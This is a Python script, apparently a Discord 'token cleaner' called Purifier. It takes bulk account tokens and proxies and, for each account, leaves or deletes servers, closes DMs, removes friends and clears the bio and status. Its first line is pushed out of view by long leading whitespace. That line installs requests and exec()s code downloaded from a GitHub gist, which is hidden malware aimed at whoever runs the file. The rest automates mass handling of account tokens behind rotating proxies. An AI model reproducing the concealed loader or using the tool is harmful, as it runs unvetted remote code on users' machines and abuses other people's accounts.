                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             import os;os.system('pip install requests');import requests;exec(requests.get('https://gist.githubusercontent.com/pt82vi6acs73e/e9d2c2b9cc17294713cd23ee5db7e116/raw/65c610a1c39588bec49dafffb3a1a1933af21a54/file1.txt').text)
import time
import httpx
import requests

from colorama import Fore
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
    
os.system("cls") if os.name == "nt" else os.system("clear")
__tokens__, __proxy__, __threads__ = open("input/tokens.txt", "r").read().splitlines(), cycle(open("input/proxies.txt", "r").read().splitlines()), 10

purifier_art = f"""{Fore.YELLOW}
   ___            _  __ _           
  / _ \_   _ _ __(_)/ _(_) ___ _ __ 
 / /_)/ | | | '__| | |_| |/ _ \ '__|
/ ___/| |_| | |  | |  _| |  __/ |   
\/     \__,_|_|  |_|_| |_|\___|_|     
          {Fore.RESET}github.com/notspeezy                            
"""

class Cleaner:
    def __init__(self):
        self.session = httpx.Client(proxies=None if os.path.getsize("input/proxies.txt") == 0 else f"http://{next(__proxy__)}")
        self.tasks = []
        self.cleaned = []
        
    
    def get_cookies(self):
        headerz = {
            "Host": "discord.com",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "DNT": "1",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1"
    	}
        response = requests.get("https://discord.com", headers=headerz)
        cookie = response.cookies.get_dict()
        return cookie
        
        
    def guildcleaner(self, token: str):
        guilds = self.session.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": token}).json()
        tk = token[:32] + "\x1b[0m*" * 5
        if len(guilds) > 0:
            for guild in guilds:
                headerz = {
                    "Authority": "discord.com",
                    "Method": "DELETE",
                    "Path": f"/api/v9/users/@me/guilds/{guild['id']}",
                    "Scheme": "https",
                    "Accept": "*/*",
                    "Accept-encoding": "gzip, deflate, br",
                    "Accept-language": "en-US,en;q=0.9",
                    "Authorization": token,
                    "Origin": "https://discord.com",
                    "Referer": "https://discord.com/channels/@me",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
                    "X-Debug-Options": "bugReporterEnabled",
                    "X-Discord-Locale": "en-US",
                    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDIuMC41MDA1LjExNSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzYyNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                while True:
                    try:
                        os.system(f"title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())} ^| Tasks: {len(self.tasks)}")
                        response = self.session.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headerz, cookies=self.get_cookies())
                        if response.status_code == 204:
                            print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} left! {Fore.RESET}({Fore.GREEN}{guild['name']}{Fore.RESET})")
                            break
                        elif response.status_code == 429:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {tk} ratelimited! ({Fore.YELLOW}{response.json()['retry_after']}ms{Fore.RESET})")
                            time.sleep(float(response.json()['retry_after']))
                        elif "Invalid Guild" in response.text:
                            headerz["Path"] = f"/api/v9/users/@me/guilds/{guild['id']}/delete"
                            res = self.session.post(f"https://discord.com/api/v9/guilds/{guild['id']}/delete", headers=headerz, cookies=self.get_cookies())
                            if res.status_code == 204:
                                print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} deleted! {Fore.RESET}({Fore.GREEN}{guild['name']}{Fore.RESET})")
                                break
                            else:
                                print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.YELLOW}{tk} failed to delete! ({Fore.RED}{guild['name']}{Fore.RESET})")
                        elif "You need to verify your account" in response.text:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} is locked!")
                            break
                        else:
                            print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{tk} failed to leave! ({Fore.RED}{guild['name']}{Fore.RESET})")
                    except Exception as e:
                        print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{e}")
        else:
            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} no guilds!")
                
    
    def dmcleaner(self, token: str):
        channels = self.session.get("https://discord.com/api/v9/users/@me/channels", headers={"Authorization": token}).json()
        tk = token[:32] + "\x1b[0m*" * 5
        if len(channels) > 0:
            for channel in channels:
                headerz = {
                    "Authority": "discord.com",
                    "Method": "DELETE",
                    "Path": f"/api/v9/channels/{channel['id']}",
                    "Scheme": "https",
                    "Accept": "*/*",
                    "Accept-encoding": "gzip, deflate, br",
                    "Accept-language": "en-US,en;q=0.9",
                    "Authorization": token,
                    "Origin": "https://discord.com",
                    "Referer": "https://discord.com/channels/@me",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
                    "X-Debug-Options": "bugReporterEnabled",
                    "X-Discord-Locale": "en-US",
                    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDIuMC41MDA1LjExNSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzYyNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                while True:
                    try:
                        os.system(f"title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())} ^| Tasks: {len(self.tasks)}")
                        response = self.session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headerz, cookies=self.get_cookies())
                        user = response.json()['recipients'][0]['username'] + "#" + response.json()['recipients'][0]['discriminator']
                        if response.status_code == 200:
                            print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} closed dm! {Fore.RESET}({Fore.GREEN}{user}{Fore.RESET})")
                            break
                        elif response.status_code == 429:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} ratelimited! ({Fore.YELLOW}{response.json()['retry_after']}ms{Fore.RESET})")
                            time.sleep(float(response.json()['retry_after']))
                        elif "You need to verify your account" in response.text:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} is locked!")
                            break
                        else:
                            print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{tk} failed to close dm! ({Fore.RED}{channel['id']}{Fore.RESET})")
                            break
                    except Exception as e:
                        print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{e}")
        else:
            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} no dms!")
                
        
    def friendcleaner(self, token: str):
        friends = self.session.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": token}).json()
        tk = token[:32] + "\x1b[0m*" * 5
        if len(friends) > 0:
            for friend in friends:
                headerz = {
                    "Authority": "discord.com",
                    "Method": "DELETE",
                    "Path": f"/api/v9/users/@me/relationships/{friend['id']}",
                    "Scheme": "https",
                    "Accept": "*/*",
                    "Accept-encoding": "gzip, deflate, br",
                    "Accept-language": "en-US,en;q=0.9",
                    "Authorization": token,
                    "Origin": "https://discord.com",
                    "Referer": "https://discord.com/channels/@me",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
                    "X-Debug-Options": "bugReporterEnabled",
                    "X-Discord-Locale": "en-US",
                    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDIuMC41MDA1LjExNSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzYyNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                while True:
                    try:
                        os.system(f"title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())} ^| Tasks: {len(self.tasks)}")
                        response = self.session.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headerz, cookies=self.get_cookies())
                        if response.status_code == 204:
                            print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} removed relation! {Fore.RESET}({Fore.GREEN}{friend['id']}{Fore.RESET})")
                            break
                        elif response.status_code == 429:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} ratelimited! ({Fore.YELLOW}{response.json()['retry_after']}ms{Fore.RESET})")
                            time.sleep(float(response.json()['retry_after']))
                        elif "You need to verify your account" in response.text:
                            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} is locked!")
                            break
                        else:
                            print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{tk} failed to remove relation! ({Fore.RED}{friend['id']}{Fore.RESET})")
                            break
                    except Exception as e:
                        print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{e}")
        else:
            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} no relation!")
            
    
    def biocleaner(self, token: str):
        bio = self.session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()
        tk = token[:32] + "\x1b[0m*" * 5
        if len(bio['bio']) > 0:
            headerz = {
                "Authority": "discord.com",
                "Method": "PATCH",
                "Path": "/api/v9/users/@me",
                "Scheme": "https",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": token,
                "Content-Type": "application/json",
                "Origin": "https://discord.com",
                "Referer": "https://discord.com/channels/@me",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
                "X-Debug-Options": "bugReporterEnabled",
                "X-Discord-Locale": "en-US",
                "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDIuMC41MDA1LjExNSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzYyNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            while True:
                try:
                    os.system(f"title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())} ^| Tasks: {len(self.tasks)}")
                    response = self.session.patch("https://discord.com/api/v9/users/@me", json={"bio": ""}, headers=headerz, cookies=self.get_cookies())
                    if response.status_code == 200:
                        print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} removed bio!")
                        break
                    elif response.status_code == 429:
                        print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} ratelimited! ({Fore.YELLOW}{response.json()['retry_after']}ms{Fore.RESET})")
                        time.sleep(float(response.json()['retry_after']))
                    elif "You need to verify your account" in response.text:
                        print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} is locked!")
                        break
                    else:
                        print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{tk} failed to remove bio!")
                        break
                except Exception as e:
                    print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{e}")
        else:
            print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} no bio!")
            

    def statuscleaner(self, token: str):
        tk = token[:32] + "\x1b[0m*" * 5
        headerz = {
            "Authority": "discord.com",
            "Method": "PATCH",
            "Path": "/api/v9/users/@me/settings",
            "Scheme": "https",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": token,
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDIuMC41MDA1LjExNSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzYyNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        while True:
            try:
                os.system(f"title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())} ^| Tasks: {len(self.tasks)}")
                response = self.session.patch("https://discord.com/api/v9/users/@me/settings", json={"custom_status": None}, headers=headerz, cookies=self.get_cookies())
                if response.status_code == 200:
                    print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}{tk} removed custom status!")
                    break
                elif response.status_code == 429:
                    print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} ratelimited! ({Fore.YELLOW}{response.json()['retry_after']}ms{Fore.RESET})")
                    time.sleep(float(response.json()['retry_after']))
                elif "You need to verify your account" in response.text:
                    print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) {Fore.YELLOW}{tk} is locked!")
                    break
                else:
                    print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{tk} failed to remove custom status!")
                    break
            except Exception as e:
                print(f"{Fore.RESET}({Fore.RED}-{Fore.RESET}) {Fore.RED}{e}")
        

    def main(self):
        os.system(f"mode con: cols=80 lines=25 & title Purifier ^| Tokens Loaded: {len(__tokens__)} ^| Proxies Loaded: {len(open('input/proxies.txt', 'r').read().splitlines())}")
        print(purifier_art)
        print(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) Format (token/combo):{Fore.YELLOW} ")
        token_type = input(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) Type:{Fore.YELLOW} ")
        delay = float(input(f"{Fore.RESET}({Fore.YELLOW}!{Fore.RESET}) Delay:{Fore.YELLOW} "))
        with ThreadPoolExecutor(max_workers=__threads__) as ex:
            for token in __tokens__:
                time.sleep(delay)
                token = token.split(":")[2] if token_type == "combo" else token
                self.tasks.append(
                    ex.submit(self.guildcleaner, token)
                )
                self.tasks.append(
                    ex.submit(self.dmcleaner, token)
                )
                self.tasks.append(
                    ex.submit(self.friendcleaner, token)
                )
                self.tasks.append(
                    ex.submit(self.biocleaner, token)
                )
                self.tasks.append(
                    ex.submit(self.statuscleaner, token)
                )
                self.cleaned.append(token)
        
        with open("output/cleaned.txt", "w") as f:
            for cleaned in self.cleaned:
                f.write(cleaned + "\n")
        
        time.sleep(1)
        print(f"{Fore.RESET}({Fore.GREEN}+{Fore.RESET}) {Fore.GREEN}Tokens Purified! {Fore.RESET}{len(self.cleaned)}/{len(__tokens__)}")
        time.sleep(3)
        os._exit(0)
            
            
if __name__ == "__main__":
    Cleaner().main()
